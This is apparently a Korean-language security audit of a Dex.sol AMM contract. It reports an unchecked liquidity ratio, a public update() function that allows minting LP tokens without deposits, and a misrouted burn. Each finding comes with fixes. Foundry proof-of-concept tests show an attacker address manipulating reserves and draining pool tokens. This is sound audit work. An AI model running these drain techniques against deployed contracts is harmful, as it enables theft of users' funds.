## medium - 토큰 유동성 풀의 AMM이 손상되어 비정상적인 가격 변동이 발생할 수 있습니다.

### 설명

./src/Dex.sol : 64-78

function addLiquidity(uint256 _amountX, uint256 _amountY, uint256 _minLP) external returns (uint256)

```solidity
function addLiquidity(uint256 _amountX, uint256 _amountY, uint256 _minLP) external returns (uint256) {
    require(IERC20(tokenX).allowance(msg.sender, address(this)) >= _amountX, "ERC20: insufficient allowance");
    require(IERC20(tokenY).allowance(msg.sender, address(this)) >= _amountY, "ERC20: insufficient allowance");
    require(IERC20(tokenX).balanceOf(msg.sender) >= _amountX, "ERC20: transfer amount exceeds balance");
    require(IERC20(tokenY).balanceOf(msg.sender) >= _amountY, "ERC20: transfer amount exceeds balance");

    IERC20(tokenX).transferFrom(msg.sender, address(this), _amountX);
    IERC20(tokenY).transferFrom(msg.sender, address(this), _amountY);

    uint256 liquidity = this.mint(msg.sender);

    require(liquidity >= _minLP, "INSUFFICIENT_LIQUIDITY_MINTED");

    return liquidity;
}
```

`addLiquidity` 함수에서 인자로 들어온 `_amountX`, `_amountY`의 값이 실제 유동성 풀의 토큰 비율과 일치하는지에 대한 검사가 존재하지 않습니다.

이에 따라 `_amountX`, `_amountY`만큼의 토큰이 모두 유동성 풀에 추가되어 유동성 풀 내의 토큰 비율이 손상될 수 있습니다.

### 파급력

Medium - 유동성 공급 비율에 대한 검사가 이루어지지 않아, 공격자가 임의로 토큰 비율을 조정할 수 있습니다.

```solidity
contract DexScript is Test {
    Dex public dex;
    IERC20 tokenX;
    IERC20 tokenY;

    function setUp() public {
        tokenX = new CustomERC20("X");
        tokenY = new CustomERC20("Y");
        dex = new Dex(address(tokenX), address(tokenY));
        tokenX.approve(address(dex), type(uint256).max);
        tokenY.approve(address(dex), type(uint256).max);

        dex.addLiquidity(800 ether, 700 ether, 0);
    }

    function test_exploit() public {
        
        uint LPReturn1 = dex.addLiquidity(8 ether, 7 ether, 0);
        console.log("LPReturn1: ", LPReturn1);

        uint swap1 = dex.swap(0, 100 ether, 0);
        console.log("swap1: ", swap1);

        
    }

    function test_exploit2() public {
        uint LPReturn2 = dex.addLiquidity(10000 ether, 1, 0);
        console.log("LPReturn2: ", LPReturn2);

        uint swap2 = dex.swap(0, 100 ether, 0);
        console.log("swap2: ", swap2);
    }
}
```

![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/dcc66554-0f51-432b-b52f-51edb25200cb/6fcd1560-58a6-4b83-b1ac-3c116f5a9927/image.png)

1. 특정 토큰의 유동성 비율을 매우 높거나 낮게 공급하여 토큰의 가격을 조정할 수 있습니다.

### 해결 방안

1. addLiquidity 함수의 인자가 아닌 실제로 추가되어야할 토큰의 양을 현재 유동성 풀의 비율에 대해 계산하여 transfer하는 방법을 사용할 수 있습니다.
    1. `_amountX`, `_amountY` 중 실제로 유동성 풀에 추가될 수 있는 양(`aX`, `bX`을 계산)
    2. 아래와 같이, 계산된 토큰의 양을 transferFrom 합니다.
    `tokenX.transferFrom(msg.sender, address(this), aX);`
    `tokenY.transferFrom(msg.sender, address(this), aY);`
2. skim 함수를 implement하여 필요한 경우 유동성 풀의 비율을 맞춰줄 수 있습니다.
    
    ```solidity
    function skim(address to) external lock {
            address _token0 = token0; // gas savings
            address _token1 = token1; // gas savings
            _safeTransfer(_token0, to, IERC20(_token0).balanceOf(address(this)).sub(reserve0));
            _safeTransfer(_token1, to, IERC20(_token1).balanceOf(address(this)).sub(reserve1));
        }
    ```
    

## critical - 토큰 유동성 공급 없이 Liquidity Token 발급이 가능합니다.

### 설명

./src/Dex.sol : 138-142

function update(uint256 _balanceX, uint256 _balanceY) public

```solidity
function update(uint256 _balanceX, uint256 _balanceY) public {
    require(_balanceX <= type(uint112).max && _balanceY <= type(uint112).max, "OVERFLOW");
    reserveX = uint112(_balanceX);
    reserveY = uint112(_balanceY);
}
```

reserve의 값을 설정하는 update 함수가 public으로 선언되어, 공격자가 원하는 값으로 reserveX, reserveY를 변경할 수 있습니다.

```solidity
function mint(address _to) external returns (uint256 liquidity) {
    (uint112 _reserveX, uint112 _reserveY) = getReserves();
    uint256 balanceX = IERC20(tokenX).balanceOf(address(this));
    uint256 balanceY = IERC20(tokenY).balanceOf(address(this));
    uint256 amountX = balanceX - _reserveX;
    uint256 amountY = balanceY - _reserveY;
    uint256 totalSupply = totalSupply();

    if (totalSupply == 0) {
        liquidity = Math.sqrt(amountX * amountY);
    } else {
        liquidity = Math.min(amountX * totalSupply / reserveX, amountY * totalSupply / reserveY);
    }

    require(liquidity > 0, "INSUFFICIENT_LIQUIDITY_MINTED");

    _mint(_to, liquidity);
    update(balanceX, balanceY);
}
```

update 후 mint를 호출하게 되면, update 된 reserveX, Y를 getReserves 함수를 통해 가져오고, 그 값을 이용해 liquidity 양을 계산합니다. 따라서, 실제로 토큰을 공급하지 않더라도 liquidity token을 mint할 수 있습니다.

### 파급력

자금의 무분별한 유출이 발생할 수 있습니다.

```solidity
function setUp() public {
    tokenX = new CustomERC20("X");
    tokenY = new CustomERC20("Y");
    dex = new Dex(address(tokenX), address(tokenY));
    tokenX.approve(address(dex), type(uint256).max);
    tokenY.approve(address(dex), type(uint256).max);

    dex.addLiquidity(8888888888 ether, 7777777777 ether, 0);
}

function test_update() public {
    address attacker = address(0x44);
    vm.startPrank(attacker);
    console.log("previous LP.balanceOf: ", dex.balanceOf(attacker));
    console.log("previous X.balanceOf: ", tokenX.balanceOf(attacker));
    console.log("previous Y.balanceOf: ", tokenY.balanceOf(attacker));

    dex.update(8 ether, 7 ether);
    dex.mint(attacker);

    dex.update(8 ether, 7 ether);
    dex.mint(address(dex));
    console.log("after LP.balanceOf: ", dex.balanceOf(attacker));
    console.log("after dex X.balanceOf: ", tokenX.balanceOf(address(dex)));
    console.log("after dex Y.balanceOf: ", tokenY.balanceOf(address(dex)));

    console.log("________removeLiquidity________");

    dex.burn(dex.balanceOf(attacker));

    console.log("after X.balanceOf: ", tokenX.balanceOf(attacker));
    console.log("after Y.balanceOf: ", tokenY.balanceOf(attacker));

    console.log("after dex X.balanceOf: ", tokenX.balanceOf(address(dex)));
    console.log("after dex Y.balanceOf: ", tokenY.balanceOf(address(dex)));
    
    vm.stopPrank();
}
```

![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/dcc66554-0f51-432b-b52f-51edb25200cb/c0bdeaa4-ff7e-4fca-9e29-737d043ab043/image.png)

1. update 함수로로 reserveX, reserveY의 값을 변조합니다.
2. swap 또는 burn 함수를 통해 contract 내의 X token, Y token의 유출이 발생할 수 있습니다.

### 해결 방안

1. update 함수의 visibility/접근 제어자를 private 또는 internal로 수정합니다.

```solidity
function update(uint256 _balanceX, uint256 _balanceY) internal {
        require(_balanceX <= type(uint112).max && _balanceY <= type(uint112).max, "OVERFLOW");
        reserveX = uint112(_balanceX);
        reserveY = uint112(_balanceY);
    }
```

## high - addLiquidity 시, 공급자에게 토큰 X, Y가 주어지지 않습니다.

### 설명

./src/Dex.sol : 83-95

function removeLiquidity(uint256 _amount, uint256 _minimumX, uint256 _minimumY)

```solidity
function removeLiquidity(uint256 _amount, uint256 _minimumX, uint256 _minimumY)
    external
    returns (uint256, uint256)
{
    transferFrom(msg.sender, address(this), _amount);

    (uint256 amountX, uint256 amountY) = this.burn(_amount);

    require(amountX >= _minimumX, "INSUFFICIENT_X_RECEIVED");
    require(amountY >= _minimumY, "INSUFFICIENT_Y_RECEIVED");

    return (amountX, amountY);
}
```

removeLiquidity 시에 사용자의 LPToken 양을 인자로 burn 함수를 호출합니다.

.src/Dex.sol : 117-134

function burn(uint256 liquidity) external returns (uint256 _amountX, uint256 _amountY)

```solidity
function burn(uint256 liquidity) external returns (uint256 _amountX, uint256 _amountY) {
    uint256 balanceX = IERC20(tokenX).balanceOf(address(this));
    uint256 balanceY = IERC20(tokenY).balanceOf(address(this));
    uint256 totalSupply = totalSupply();

    _amountX = liquidity * balanceX / totalSupply;
    _amountY = liquidity * balanceY / totalSupply;

    require(_amountX > 0 && _amountY > 0, "INSUFFICENT_LIQUIDITY_BURNED");
    _burn(address(this), liquidity);
    safeTransfer(tokenX, msg.sender, _amountX);
    safeTransfer(tokenY, msg.sender, _amountY);

    balanceX = IERC20(tokenX).balanceOf(address(this));
    balanceY = IERC20(tokenY).balanceOf(address(this));

    update(balanceX, balanceY);
}
```

burn 함수는 external로 선언되어, this.burn으로 해당 함수를 호출하는 msg.sender는 Dex contract의 주소가 됩니다. 

## 파급력

removeLiquidity로 유동성 제거 시에, Token X, Y는 Dex Contract가 그대로 가지게 되어 유동성 제거자는 토큰을 돌려받을 수 없습니다.

## 해결 방안

burn을 internal 또는 public으로 선언하여, msg.sender가 유동성 공급자가 되도록 허용합니다.

```solidity
function burn(uint256 liquidity) public returns (uint256 _amountX, uint256 _amountY) {
```
